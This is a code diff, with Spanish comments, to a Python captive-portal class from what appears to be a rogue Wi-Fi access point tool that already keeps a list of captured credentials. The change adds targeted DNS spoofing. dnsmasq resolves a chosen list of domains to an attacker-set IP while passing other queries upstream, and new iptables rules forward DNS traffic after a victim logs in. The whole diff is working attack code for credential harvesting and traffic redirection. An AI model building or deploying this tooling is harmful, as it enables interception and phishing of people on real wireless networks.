@@ -661,6 +661,10 @@ class CaptivePortal:
         self.captured_creds  = []
         self._logged_in_ips  = set()
 
+        # DNS Spoofing por dominio específico
+        self.dns_spoof_domains   = []
+        self.dns_spoof_target_ip = GATEWAY_IP
+
         self._hostapd_conf = "/tmp/wt_cp_hostapd.conf"
         self._dnsmasq_conf = "/tmp/wt_cp_dnsmasq.conf"
         self._dnsmasq_pid  = "/tmp/wt_cp_dnsmasq.pid"
@@ -714,18 +718,38 @@ class CaptivePortal:
         self._log("hostapd.conf → " + self._hostapd_conf)
 
     def _write_dnsmasq_conf(self):
-        conf = (
-            "interface=" + self.interface + "\n"
-            "bind-interfaces\n"
-            "dhcp-range=" + DHCP_START + "," + DHCP_END + "," + SUBNET_MASK + ",5m\n"
-            "dhcp-option=3," + GATEWAY_IP + "\n"
-            "dhcp-option=6," + GATEWAY_IP + "\n"
-            "dhcp-option=114,http://" + GATEWAY_IP + "/\n"
-            "address=/#/" + GATEWAY_IP + "\n"
-            "local-ttl=0\n"
-            "log-dhcp\n"
-            "no-resolv\n"
-        )
+        if self.dns_spoof_domains:
+            target = self.dns_spoof_target_ip or GATEWAY_IP
+            conf = (
+                "interface=" + self.interface + "\n"
+                "bind-interfaces\n"
+                "dhcp-range=" + DHCP_START + "," + DHCP_END + "," + SUBNET_MASK + ",5m\n"
+                "dhcp-option=3," + GATEWAY_IP + "\n"
+                "dhcp-option=6," + GATEWAY_IP + "\n"
+                "dhcp-option=114,http://" + GATEWAY_IP + "/\n"
+                "server=" + UPSTREAM_DNS + "\n"
+                "local-ttl=0\n"
+                "log-dhcp\n"
+                "log-queries\n"
+            )
+            for domain in self.dns_spoof_domains:
+                domain = domain.strip().lower()
+                if domain:
+                    conf += "address=/" + domain + "/" + target + "\n"
+            self._log("[DNS Spoof] " + str(len(self.dns_spoof_domains)) + " dominios → " + target)
+        else:
+            conf = (
+                "interface=" + self.interface + "\n"
+                "bind-interfaces\n"
+                "dhcp-range=" + DHCP_START + "," + DHCP_END + "," + SUBNET_MASK + ",5m\n"
+                "dhcp-option=3," + GATEWAY_IP + "\n"
+                "dhcp-option=6," + GATEWAY_IP + "\n"
+                "dhcp-option=114,http://" + GATEWAY_IP + "/\n"
+                "address=/#/" + GATEWAY_IP + "\n"
+                "local-ttl=0\n"
+                "log-dhcp\n"
+                "no-resolv\n"
+            )
         open(self._dnsmasq_conf, "w").write(conf)
         self._log("dnsmasq.conf → " + self._dnsmasq_conf)
 
@@ -777,12 +801,22 @@ class CaptivePortal:
         subprocess.run(["iptables", "-D", "FORWARD", "-i", iface, "-j", "DROP"],
                        capture_output=True)
 
-        for proto in ("udp", "tcp"):
-            subprocess.run(["iptables", "-t", "nat", "-I", "PREROUTING", "1",
-                            "-i", iface, "-s", client_ip,
-                            "-p", proto, "--dport", "53",
-                            "-j", "DNAT", "--to-destination=" + UPSTREAM_DNS + ":53"],
-                           capture_output=True)
+        if self.dns_spoof_domains:
+            # Modo DNS Spoofing: dnsmasq ya hace de proxy DNS real (server=UPSTREAM_DNS).
+            # El cliente apunta a dnsmasq por DHCP, no necesitamos DNAT del port 53.
+            for proto in ("udp", "tcp"):
+                subprocess.run(["iptables", "-I", "FORWARD", "1",
+                                "-i", iface, "-o", out_if,
+                                "-p", proto, "--dport", "53", "-j", "ACCEPT"],
+                               capture_output=True)
+        else:
+            # Modo portal puro: redirigir DNS del cliente al upstream post-login
+            for proto in ("udp", "tcp"):
+                subprocess.run(["iptables", "-t", "nat", "-I", "PREROUTING", "1",
+                                "-i", iface, "-s", client_ip,
+                                "-p", proto, "--dport", "53",
+                                "-j", "DNAT", "--to-destination=" + UPSTREAM_DNS + ":53"],
+                               capture_output=True)
 
         for port in ("80", "443"):
             subprocess.run(["iptables", "-t", "nat", "-I", "PREROUTING", "1",
